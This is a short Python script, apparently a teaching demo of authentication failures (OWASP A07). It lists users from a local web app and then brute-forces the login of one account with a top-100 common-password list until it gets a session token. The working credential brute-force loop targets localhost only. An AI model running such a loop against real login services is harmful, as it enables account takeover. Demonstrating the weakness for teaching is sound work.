# Author: Andrew Higgins
# https://github.com/speckly

# A07 Detailed demo
# Modified 100 passwords file, replaced "abc123" with "123" for demo purposes

import requests
import os
import user_data

ENDPOINT = "/user/login"
URL = f"http://localhost:8081{ENDPOINT}"

os.system('cls')
print("Script by @speckly\nkitten escalation\n")

user_data.get_users("http://localhost:8081/users")
print("Narrowed down which account to brute force. Username: user\nBut what is the password?")

success = False
with open("./exploit_demos/10-million-password-list-top-100.txt") as password_file:
    for attempt, password in enumerate(password_file):
        password = password.strip()
        LOGIN_BODY = {
            "username": "user",
            "password": password
        }
        LOGIN_ENDPOINT = "http://localhost:8081/user/login"
        res = requests.post(LOGIN_ENDPOINT, json=LOGIN_BODY)
        if res.status_code == 500:
            msg = res.text
        else:
            TOKEN = res.json()["token"]
            msg = f"Success, token is {TOKEN}"
            success = True
        print(f"#{attempt+1} {password}: {msg}")
        if success:
            break

